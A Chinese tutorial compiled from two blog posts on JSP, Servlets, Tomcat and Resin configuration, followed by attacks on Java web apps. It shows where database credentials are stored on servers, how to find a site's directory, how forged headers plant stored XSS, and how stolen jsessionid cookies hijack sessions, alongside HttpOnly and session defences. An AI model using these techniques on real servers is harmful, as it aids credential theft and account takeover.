

# 1
JSP: 全名为java server page，其根本是一个简化的[Servlet](http://baike.baidu.com/view/25169.htm)。

Servlet：Servlet是一种服务器端的Java应用程序，可以生成动态的Web页面。

JavaEE: JavaEE是J2EE新的名称。改名目的是让大家清楚J2EE只是Java企业应用。

什么叫Jsp什么叫Java我真的非常让大家搞清楚！拜托别一上来就来一句：“前几天我搞了一个jsp的服务器，可难吭了。”。

请大家分清楚什么是jsp什么是JavaEE! Java平台结构图：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30101703-0bcb506fb6d743579c82956177b5a871.jpg)

可以看到Java平台非常的庞大，而开发者的分化为：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30101737-504c61d996984cc990d9aede8daa1fa9.jpg)

列举这两个图的原因就是让你知道你看到的JSP不过是冰山一角，Jsp技术不过是Java初级开发人员必备的技术而已。

我今天要讲的就是Java树的最下面的两层了，也是初级工程师需要掌握的东西。

Web请求与相应简要的流程：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30101824-8e9533bbe15d4c00a3708a45ee41941b.gif)

这是一个典型的就是客户端发送一个HTTP请求到服务器端，服务器端接收到请求并处理、响应的一个过程。

如果请求的是JSP，tomcat会把我们的JSP编译成Servlet也就是一个普通的Java类。

其实JSP是Servlet的一种特殊形式，每个JSP页面就是一个Servlet实例。Servlet又是一个普通的Java类它编译后就是一个普通的class文件。

这是一个普通的jsp脚本页面，因为我只用JSP来作为展示层仅仅做了简单的后端数据的页面展示：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30101923-ef33ebb716dd415caecc53d1af34bf52.jpg)

上图可以非常清晰的看到通常的Jsp在项目中的地位并不如我们大多数人所想的那么重要，甚至是可有可无！因为我们完全可以用其他的东西来代替JSP作为前端展示层。 我们来看一下这个页面编译成class后是什么样子：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30101951-e7cf7178ceae44a7a218070ee3a68764.jpg)

你会发现你根本就看不懂这个class文件，因为这是字节码文件我们根本就没法看。通过我们的TOMCAT编译后他编程了一个Java类文件保存在Tomcat的work目录下。

文件目录：`C:apache-tomcat-7.0.34workCatalinalocalhost你的项目名orgapachejsp`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102038-f8d4373f5c8d457ab70a85edad6a1d8f.jpg)

我们只要打开index\_jsp.java或者用jd-gui（Java反编译工具）打开就行了：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102131-9a74f37818294321a2624d7d1951fe14.jpg)

有人说这是Servlet吗？当然了。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102220-54574afabb9249ea881420d1bfed9465.jpg)

继承HttpJspBase类，该类其实是个HttpServlet的子类(jasper是tomcat的jsp engine)。

Jsp有着比Servlet更加优越的展现，很多初学PHP的人恐怕很难把视图和逻辑分开吧。比如之前在写PHPSQL注入测试的DEMO：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102305-bdef8244e8e64a7daa1220d5b82ef5b5.jpg)

这代码看起来似乎没有什么大的问题，也能正确的跑起来啊会有什么问题呢？原因很简单这属于典型的展现和业务逻辑没有分开！这和写得烂的Servlet差不多！

说了这么多，很多人会觉得Servlet很抽象。我们还是连创建一个Servlet吧：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102323-be8484c5fd264deca56e0bc0791cacc6.jpg)

创建成功后会自动的往web.xml里面写入：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102414-39f88976f06d47a1a0d0d238c75ae0bc.jpg)

其实就是一个映射的URL和一个处理映射的类的路径。而我们自动生成的Java类精简后大致是这个样子：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102504-c3a1bdb13eb8465cac8d2b5144f0a60f.jpg)

请求响应输出内容：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102549-88c35bcae1f14d03ae77f04f3a94507a.jpg)

熟悉PHP的大神们这里就不做解释了哦。了解了Jsp、Servlet我们再来非常简单的看一下JavaWeb应用是怎样跑起来的。

加载web.xml的配置然后从配置里面获取各种信息为WEB应用启动准备。

科普：C:apache-tomcat-7.0.34/webapps下默认是部署的Web项目。webapps 下的文件夹就是你的项目名了，而项目下的WebRoot一般就是网站的根目录了，WebRoot下的文件夹WEB-INF默认是不让Web访问的，一般存在配置泄漏多半是nginx配置没有过滤掉这个目录。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102620-c8ca762444664899a181a7ca1eeac44f.jpg)

快速定位数据库连接信息：

大家可能都非常关心数据库连接一般都配置在什么地方呢？

答案普遍是：`C:apache-tomcat-7.0.34/webapps/wordpress/WEB-INF`下的`***.xml`

大多数的Spring框架都是配置在applicationContext里面的：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102800-4fcbf2ffc81a4326ba3b701d9bf5c3bf.jpg)

如果用到Hibernate框架那么：`WebRootWEB-INFhibernate.cfg.xml`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102811-d6f50045045a441bb063e71ee24a6440.jpg)

还有一种变态的配置方式就是直接卸载源代码里面:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102823-8a6ab74025d44a1ab8d0a705668de9d8.jpg)

Tomcat的数据源（其他的服务器大同小异）：

目录：`C:apache-tomcat-7.0.34confcontext.xml、server.xml`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102846-50fce85ed7b14c079eae2e3ded2f8d5d.jpg)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30102931-4fcc88e0a1374144828e0a4a802e23d6.jpg)

Resin数据源：

路径：`D:installDev-
esin-pro-4.0.28conf-
esin.conf(resin 3.x是resin.xml)`

其他的配置方式诸如读取如JEECMS读取的就是**.properties**配置文件，这种方式非常的常见：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30103020-fb001f719135436a90a18064cfa0c50e.jpg)

**0x01 Tomcat 基础**

* * *

**![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30103105-c20268a9e1a544af92d57fc992329a00.x-png)**

没错,这就是 TOM 猫。楼主跟这只猫打交道已经有好几年了,在 Java 应用当中 TOMCAT 运用的非常的广泛。

TOM 猫是一个 Web 应用服务器,也是 Servlet 容器。

Apache+Tomcat 做负载均衡:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30103128-36f855597b554c43a6f6c9480272844b.jpg)

#### Tomcat快速定位到网站目录：

如何快速的找到tomcat的安装路径:

`1、不管是谁都应该明白的是不管apache还是tomcat安装的路径都是随意的，所以找不到路径也是非常正常的。-
2、在你的/etc/httpd/conf/httpd.conf里面会有一个LoadModule jk_module配置用于集成tomcat然后找到JkWorkersFile也就是tomcat的配置，找到.properties的路径。httpd里面也有可能会配置路径如果没有找到那就去apache2confextrahttpd-vhosts看下有没有配置域名绑定。-
3、在第二步的时候找到了properties配置文件并读取，找到workers.tomcat_home也就是tomcat的配置路径了。-
4、得到tomcat的路径你还没有成功，域名的具体配置是在conf下的server.xml。-
5、读取server.xml不出意外你就可以找到网站的目录了。-
6、如果第五步没有找到那么去webapps目录下ROOT瞧瞧默认不配置的话网站是部署在ROOT下的。-
7、这一点是附加的科普知识爱听则听：数据库如果启用的tomcat有可能会采用tomcat的数据源配置未见为conf下的context.xml、server.xml。如果网站有域名绑定那么你可以试下ping域名然后带上端口访问。有可能会出现tomcat的登录界面。tomcat默认是没有配置用户登录的，所以当tomcat-users.xml下没有相关的用户配置就别在这里浪费时间了。-
8、如果配置未找到那么到网站目录下的WEB-INF目录和其下的classes目录下找下对应的properties、xml（一般都是properties）。-
9、如果你够蛋疼可以读取WEB.XML下的classess内的源码。-
10、祝你好运。-
`

#### apache快速定位到网站目录：

普通的域名绑定：

直接添加到`confhttpd.conf、confextrahttpd-vhosts.conf`

#### Resin快速定位到网站目录:

在resin的conf下的resin.conf(resin3.x)和resin.xml(resin4.x)

Resin apache 负载均衡配置(从我以前的文章中节选的)

APACHE RESIN 做负载均衡,Resin 用来做 JAVAWEB 的支持,APACHE 用于处理静态

和 PHP 请求,RESIN 的速度飞快,RESIN 和 apache 的配合应该是非常完美的吧。

域名解析:

apache 的 httpd.conf:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30103223-ab7e9ce35cbb4578833cd7b68d966776.jpg)

需要修改:Include conf/extra/httpd-vhosts.conf(一定要把前面的#除掉,否则配置不起作用)

普通的域名绑定:

直接添加到 httpd.conf

<VirtualHost \*:80> ServerAdmin admin@bjcyw.cn DocumentRoot E:/XXXX/XXX ServerName beijingcanyinwang.com ErrorLog E:/XXXX/XXX/bssn-error\_log CustomLog E:/XXXX/XXX/bssn\_log common </VirtualHost>

二级域名绑定,需要修改:

E:installapache2confextrahttpd-vhosts.conf

如:

<VirtualHost \*:80> DocumentRoot E:/XXXXXXX/XXX ServerName bbs.beijingcanyinwang.com DirectoryIndex index.html index.php index.htm </VirtualHost>

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30103316-9fea6c41914d49efad7d7fdb9843efbd.x-png)

Resin 的

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30103333-3d6e32f44e0a4d8bac4fb5cca54f75d2.jpg)

请求处理:

![复制代码](https://image.cubox.pro/article/2020111514291454801/39224.jpg)

![复制代码](https://image.cubox.pro/article/2020111514291454801/39224.jpg)

<LocationMatch (.\*?).jsp> SetHandler caucho-request </LocationMatch> <LocationMatch (.\*?).action> SetHandler caucho-request </LocationMatch> <LocationMatch union-resin-stat-davic> SetHandler caucho-request </LocationMatch> <LocationMatch stat> SetHandler caucho-request </LocationMatch> <LocationMatch load> SetHandler caucho-request </LocationMatch> <LocationMatch vote> SetHandler caucho-request </LocationMatch>

![复制代码](https://image.cubox.pro/article/2020111514291454801/39224.jpg)

![复制代码](https://image.cubox.pro/article/2020111514291454801/39224.jpg)

APACHE 添加对 Resin 的支持:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30103421-719266ab42fa41d18f19a8234afac559.x-png)

LoadModule caucho\_module "E:/install/resin-pro-3.1.12/win32/apache-2.2/mod\_caucho. dll"

然后在末尾加上:

<IfModule mod\_caucho.c> ResinConfigServer localhost 6800 CauchoStatus yes </IfModule>

只有就能让 apache 找到 resin 了。

PHP 支持问题:

resin 默认是支持 PHP 的测试 4.0.29 的时候就算你把 PHP 解析的 servlet 配置删了一样解析 PHP,无奈换成了 resin 3.1 在注释掉 PHP 的 servlet 配置就无压力了。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30103521-67287f5f76144185a0cab206c3320e73.jpg)

整合成功后:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages0.cnblogs.com%2Fblog%2F552788%2F201307%2F30103537-96871832cfcc45469f55c16f07ba8ca1.x-png)

# 攻击JavaWeb应用、CS交互安全

[blog.csdn.net](https://blog.csdn.net/Fly_hps/article/details/80355532)



### 0x00 Request & Response(请求与响应)

请求和响应在Web开发当中没有语言之分不管是ASP、PHP、ASPX还是JAVAEE也好，Web服务的核心应该是一样的。

在我看来Web开发最为核心也是最为基础的东西就是Request和Response！我们的Web应用最终都是面向用户的，而请求和响应完成了客户端和服务器端的交互。 服务器的工作主要是围绕着客户端的请求与响应的。

如下图我们通过Tamper data拦截请求后可以从请求头中清晰的看到发出请求的客户端请求的地址为：localhost。

浏览器为FireFox，操作系统为Win7等信息，这些是客户端的请求行为，也就是Request。 ￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517191808136%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

当客户端发送一个Http请求到达服务器端之后，服务器端会接受到客户端提交的请求信息(HttpServletRequest)，然后进行处理并返回处理结(HttpServletResopnse)。

下图演示了服务器接收到客户端发送的请求头里面包含的信息： ￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517191826589%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

#### 请求头信息伪造XSS

关于伪造问题我是这样理解的:发送Http请求是客户端的主动行为，服务器端通过ServerSocket监听并按照Http协议去解析客户端的请求行为。

所以请求头当中的信息可能并不一定遵循标准Http协议。

用FireFox的Tamper Data和Moify Headers（FireFox扩展中心搜Headers和Tamper Data都能找到） 插件修改下就实现了，请先安装FireFox和Tamper Data：  ￼    点击Start Tamper 然后请求Web页面，会发现请求已经被Tamper Data拦截下来了。选择Tamper：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192042143%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

点击Start Tamper 然后请求Web页面，会发现请求已经被Tamper Data拦截下来了。选择Tamper：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192050980%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

修改请求头信息： ￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192117960%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192147408%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

源码下载：[http://pan.baidu.com/share/link?shareid=166499&uk=2332775740](http://pan.baidu.com/share/link?shareid=166499&uk=2332775740)

使用Moify Headers自定义的修改Headers:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192212368%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018051719221889%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192230726%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

修改请求头的作用是在某些业务逻辑下程序猿需要去记录用户的请求头信息到数据库，而通过伪造的请求头一旦到了数据库可能造成xss，或者在未到数据库的时候就造成了SQL注入，因为对于程序员来说，大多数人认为一般从Headers里面取出来的数据是安全可靠的，可以放心的拼SQL(记得好像Discuz有这样一个漏洞)。今年一月份的时候我发现xss.tw也有一个这样的经典案例，Wdot那哥们在记录用户的请求头信息的时候没有去转意特殊的脚本，导致我们通过伪造的请求头直接存储到数据库。

XSS.tw平台由于没有对请求头处理导致可以通过XSS屌丝逆袭高富黑。 刚回来的时候被随风玩爆菊了。通过修改请求头信息为XSS脚本，xss那平台直接接收并信任参数，因为很少有人会蛋疼的去怀疑请求头的信息，所以这里造成了存储型的XSS。只要别人一登录xss就会自动的执行我们的XSS代码了。

Xss.tw由于ID很容易预测，所以很轻易的就能够影响到所有用户：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192244610%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

于是某一天就有了所有的xss.tw用户被随风那2货全部弹了www.gov.cn: ￼-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192259827%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

#### Java里面伪造Http请求头



![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192346378%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-
Test Servlet-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192746323%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

0x01 Session

* * *

Session是存储于服务器内存当中的会话，我们知道Http是无状态协议，为了支持客户端与服务器之间的交互，我们就需要通过不同的技术为交互存储状态，而这些不同的技术就是Cookie和Session了。


![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517192938557%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)直接获取session如下图可以看到我们用FireFox和Chrome请求同一个URL得到的SessionId并不一样，说明SessionId是唯一的。一旦Session在服务器端设置成功那么我们在此次回话当中就可以一直共享这个SessionId对应的session信息，而session是有有效期的，一般默认在20-30分钟，你会看到xss平台往往有一个功能叫keepSession，每过一段时间就带着sessionId去请求一次，其实就是在保持session的有效不过期。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517193000127%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517193014559%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

#### Session 生命周期(从创建到销毁)

1、session的默认过期时间是30分钟，可修改的最大时间是1440分钟（1440除以60=24小时=1天）。

2、服务器重启或关闭Session失效。

 注：浏览器关闭其实并不会让session失效！因为session是存储在服务器端内存当中的。客户端把浏览器关闭了服务器怎么可能知道？正确的解释或许应该是浏览器关闭后不会去记忆关闭前客户端和服务器端之间的session信息且服务器端没有将sessionId以Cookie的方式写入到客户端缓存当中，重新打开浏览器之后并不会带着关闭之前的sessionId去访问服务器URL，服务器从请求中得不到sessionId自然给人的感觉就是session不存在（自己理解的）。

当我们关闭服务器时Tomcat会在安装目录workCatalinalocalhost项目名目录下建立SESSIONS.ser文件。此文件就是Session在Tomcat停止的时候 持久化到硬盘中的文件. 所有当前访问的用户Session都存储到此文件中. Tomcat启动成功后.SESSIONS.ser 又会反序列化到内存中,所以启动成功后此文件就消失了. 所以正常情况下 从启Tomcat用户是不需要登录的. 注意有个前提，就是存储到Session里面的user对象所对应的User类必须要序列化才可以。（摘自：[http://alone-knight.iteye.com/blog/1611112](http://alone-knight.iteye.com/blog/1611112)）

#### SessionId是神马？有什么用？-

我们不妨来做一个偷取sessionId的实验： 首先访问：http://localhost/Test/SessionTest?action=setSession&name=selina 完成session的创建，如何建立就不解释了如上所述。

同时开启FireFox和Chrome浏览器设置两个Session：  ￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517193028566%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

我们来看下当前用户的请求头分别是怎样的：  ￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517193133189%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

我们依旧用TamperData来修改请求的Cookie当中的jsessionId，下面是见证奇迹的时刻：  ￼-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018051719320461%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

我要说的话都已经在图片当中的文字注释里面了，伟大的Xss黑客们看明白了吗？你盗取的也许是jsessionId(Java里面叫jsessionId)，而不只是cookie。那么假设我们的Session被设置得特别长那么这个SessionId就会长时间的保留，而为Xss攻击提供了得天独厚的条件。而这种Session长期存在会浪费服务器的内存也会导致：SessionFixation攻击！

#### 如何应对SessionFixation攻击

1、用户输入正确的凭据，系统验证用户并完成登录，并建立新的会话ID。

2、Session会话加Ip控制

3、加强程序员的防范意识：写出明显xss的程序员记过一次，写出隐晦的xss的程序员警告教育一次，连续查出存在3个及其以上xss的程序员理解解除劳动合同(哈哈，开玩笑了)。

### 0x02 Cookie

* * *

Cookie是以文件形式\[缓存在客户端\]的凭证(精简下为了通俗易懂)，cookie的生命周期主要在于服务器给设置的有效时间。如果不设置过期时间，则表示这个cookie生命周期为浏览器会话期间，只要关闭浏览器窗口，cookie就消失了。 这次我们以IE为例：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517193228959%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

我们来创建一个Cookie：-


有些大牛级别的程序员直接把帐号密码明文存储到客户端的cookie里面去，不得不佩服其功力深厚啊。客户端直接记事本打开就能看到自己的帐号密码了。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517193257587%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

继续读取Cookie：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517193311459%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

我想cookie以明文的形式存储在客户端我就不用解释了吧？文件和数据摆在面前！ 盗取cookie的最直接的方式就是xss，利用IE浏览器输出当前站点的cookie：-

    javascript:document.write(document.cookie)          ￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517193827240%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

首先我们用FireFox创建cookie： ￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517193828113%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

然后TamperData修改Cookie：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517193920573%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

一般来说直接把cookie发送给服务器服务器，程序员过度相信客户端cookie值那么我们就可以在不用知道用户名和密码的情况下登录后台，甚至是cookie注入。jsessionid也会放到cookie里面，所以拿到了cookie对应的也拿到了jsessionid，拿到了jsessionid就拿到了对应的会话当中的所有信息，而如果那个jsessionid恰好是管理员的呢？-

### 0x03 HttpOnly

上面我们用-

    javascript:document.write(document.cookie)

通过document对象能够拿到存储于客户端的cookie信息。

HttpOnly设置后再使用document.cookie去取cookie值就不行了。

通过添加HttpOnly以后会在原cookie后多出一个HttpOnly;

普通的cookie设置：

    Cookie: jsessionid=AS348AF929FK219CKA9FK3B79870H;

加上HttpOnly后的Cookie：

    Cookie: jsessionid=AS348AF929FK219CKA9FK3B79870H; HttpOnly;

（参考YearOfSecurityforJava）

在JAVAEE6的API里面已经有了直接设置HttpOnly的方法了： ￼

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517194035458%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

API的对应说明：

